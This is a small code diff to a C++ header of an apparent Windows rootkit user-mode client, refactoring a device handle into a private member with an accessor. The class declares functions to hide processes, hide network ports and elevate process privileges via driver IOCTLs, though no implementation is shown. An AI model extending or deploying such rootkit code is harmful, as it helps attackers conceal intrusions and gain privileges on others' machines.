@@ -14,6 +14,8 @@ enum class RookitIoctls {
 };
 
 class DriverHandler {
+	HANDLE m_device_handle;
+	
 public:
 	DriverHandler();
 	~DriverHandler();
@@ -21,6 +23,6 @@ public:
 	bool hide_process(char* message);
 	bool elevate_process(char* message);
 	bool hide_port(char* message);
-	HANDLE hDevice;
+	HANDLE device_handle();
 };
 }
